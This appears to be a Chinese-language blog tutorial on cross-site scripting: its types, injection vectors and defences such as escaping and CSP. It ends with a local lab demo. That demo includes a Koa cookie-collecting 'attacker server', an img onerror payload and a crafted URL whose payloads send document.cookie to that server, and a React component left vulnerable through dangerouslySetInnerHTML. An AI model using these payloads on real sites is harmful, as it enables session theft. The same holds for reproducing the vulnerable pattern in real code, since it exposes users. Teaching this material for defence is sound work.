
# XSS攻击之剖析与预防 #

## 目录 ##

1. [参考链接](#href1)
2. [什么是XSS](#href2)
3. [XSS分类](#href3)
    1. [存储型XSS](#href3-1)
    2. [反射型XSS](#href3-2)
    3. [DOM型XSS](#href3-3)
4. [XSS的注入方法](#href4)
5. [XSS的预防](#href5)
    1. [一般的预防](#href5-4)
    2. [DOM型XSS攻击的预防](#href5-5)
    3. [Content Security Policy](#href5-6)
6. [XSS攻击实例](#href6)
    1. [文章编辑与访问](#href6-7)
    2. [伪造链接](#href6-8)

## <a name="href1">参考链接</a> ##

- [前端安全系列（一）: 如何防止XSS攻击？](https://juejin.im/post/5bad9140e51d450e935c6d64)

## <a name="href2">什么是XSS</a> ##

Cross-Site Scripting(跨站脚本攻击)简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

## <a name="href3">XSS分类</a> ##

### <a name="href3-1">存储型XSS</a> ###

常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。攻击步骤如下:

1. 攻击者将恶意代码提交到目标网站的数据库中;
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器;
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行;
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

### <a name="href3-2">反射型XSS</a> ###

常见于通过 URL 传递参数的功能，如网站搜索、跳转等，由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。攻击步骤如下:

1. 攻击者构造出特殊的 URL，其中包含恶意代码;
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器;
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行;
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

### <a name="href3-3">DOM型XSS</a> ###

DOM 型 XSS 跟前两种 XSS 的区别: DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。攻击步骤如下:

1. 攻击者构造出特殊的 URL，其中包含恶意代码;
2. 用户打开带有恶意代码的 URL;
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行;
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

## <a name="href4">XSS的注入方法</a> ##

1. 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入;
2. 在内联的 JavaScript 中，拼接的数据突破了原本的限制(字符串，变量，方法名等);
3. 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签;
4. 在标签的 href、src 等属性中，包含`javascript:`等可执行代码;
5. 在 onload、onerror、onclick 等事件中，注入不受控制代码;
6. 在 style 属性和标签中，包含类似`background-image:url("javascript:...");`的代码(新版本浏览器已经可以防范);
7. 在 style 属性和标签中，包含类似`expression(...)`的 CSS 表达式代码(新版本浏览器已经可以防范)。

## <a name="href5">XSS的预防</a> ##

首先谨记，在处理输入时，以下内容都不可信:

1. 来自用户的 UGC 信息;
2. 来自第三方的链接;
3. URL 参数;
4. POST 参数;
5. Referer(可能来自不可信的来源);
6. Cookie(可能来自其他子域注入);

### <a name="href5-4">一般的预防</a> ###

1. 输入过滤: 输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题，在防范 XSS 攻击时应避免此类方法。但是对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的;

2. 纯前端渲染: JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上，但纯前端渲染还需注意避免 DOM 型 XSS 漏洞;

3. 转义 HTML: 如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义;

4. HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie;

5. 验证码: 防止脚本冒充用户提交危险操作;

6. 对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。

### <a name="href5-5">DOM型XSS攻击的预防</a> ###

DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。

在使用`.innerHTML`、`.outerHTML`、`document.write()`时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用`.textContent`、`.setAttribute()`等。

如果用 Vue/React 技术栈，并且不使用`v-html/dangerouslySetInnerHTML`功能，就在前端 render 阶段避免`innerHTML`、`outerHTML`的 XSS 隐患。

DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，`<a>`标签的 href 属性，JavaScript 的`eval()`、`setTimeout()`、`setInterval()`等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。

### <a name="href5-6">Content Security Policy</a> ###

严格的 CSP 在 XSS 的防范中可以起到以下的作用:

1. 禁止加载外域代码，防止复杂的攻击逻辑;
2. 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域;
3. 禁止内联脚本执行(规则较严格，目前发现 GitHub 使用);
4. 禁止未授权的脚本执行(新特性，Google Map 移动版在使用);
5. 合理使用上报可以及时发现 XSS，利于尽快修复问题。

## <a name="href6">XSS攻击实例</a> ##

### <a name="href6-7">文章编辑与访问</a> ###

1. 攻击者服务器(Node.js koa服务器，域名`http://127.0.0.1:2222`)

只配置一个简单的接口"/receive/:cookie"，代码如下:

```js
async function get (ctx, next) {
    const { cookie } = ctx.params;

    ctx.set({
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'application/x-www-form-urlencoded'
    });

    ctx.body = JSON.stringify({ result: 1 });
    console.log(cookie);
}
```

捕捉到接口获取的 cookie 数据并打印出来。

2. 受害者客户端(Dva 框架，域名`http://127.0.0.1:20151`)

编辑页:

![image](https://raw.githubusercontent.com/WebUnion-core/anthill/master/WJT20/images/w138.png)

在文本域中注入以下脚本:

```html
<img src="none" style="display:none" onerror="fetch('http://127.0.0.1:2222/receive/' + encodeURIComponent(document.cookie))" />
```

点击提交按钮即可。

详情页:

![image](https://raw.githubusercontent.com/WebUnion-core/anthill/master/WJT20/images/w139.png)

详情页使用`dangerouslySetInnerHTML`接收详情接口返回的文本内容，任何用户都可以访问详情页，用户访问详情时，看不到任何内容，但是恶意代码已经将用户的 cookie 通过 fetch 请求的形式发送给了攻击者服务器。

回头看看攻击者的服务器，控制台已经打印出了受害者的 cookie:

![image](https://raw.githubusercontent.com/WebUnion-core/anthill/master/WJT20/images/w140.png)

### <a name="href6-8">伪造链接</a> ###

伪造链接的 XSS 攻击，其实就是 DOM 型 XSS 攻击，我们设计这么一个页面，通过获取 URL 查询字符串中的 name 字段，将其直接用 dangerouslySetInnerHTML 渲染到页面上，受害者客户端的代码是这样子的:

```
export class User extends React.Component {
    render() {
        const { theme } = this.props;
        const { query } = new Url(window.location.href.replace('/#', ''), true);

        return (
            <div className={`${styles['user-container']} ${theme}`}>
                <label>Name: </label>
                <span dangerouslySetInnerHTML={{ __html: query.name }} />
            </div>
        );
    }
}
```

正常的页面链接是这样的: `http://127.0.0.1:20151/#/user?name=WJT20`。

攻击者只要修改一下链接，例如改成这样子`http://127.0.0.1:20151/#/user?name=<a onclick%3D"fetch('http%3A%2F%2F127.0.0.1%3A2222%2Freceive%2F'%2BencodeURIComponent(document.cookie))" href%3D"javascript%3Avoid(0)">WJT20<%2Fa>`，即可在页面上伪造出一个链接，用户可能被超链接样式所迷惑，然后就去点击超链接，结果发现没有任何反应，其实这时候他的 cookie 已经通过 fetch 发送到了攻击者的服务器:

![image](https://raw.githubusercontent.com/WebUnion-core/anthill/master/WJT20/images/w141.png)

将此 URL 上的`<a onclick%3D"fetch('http%3A%2F%2F127.0.0.1%3A2222%2Freceive%2F'%2BencodeURIComponent(document.cookie))" href%3D"javascript%3Avoid(0)">WJT20<%2Fa>`部分格式化后你就会发现，这其实就是一个a标签:

```
<a onclick=\"fetch('http://127.0.0.1:2222/receive/'+encodeURIComponent(document.cookie))\" href=\"javascript:void(0)\">WJT20</a>
```

---

```
ID         : 134
DATE       : 2019/08/06
AUTHER     : WJT20
TAG        : 安全防护
```
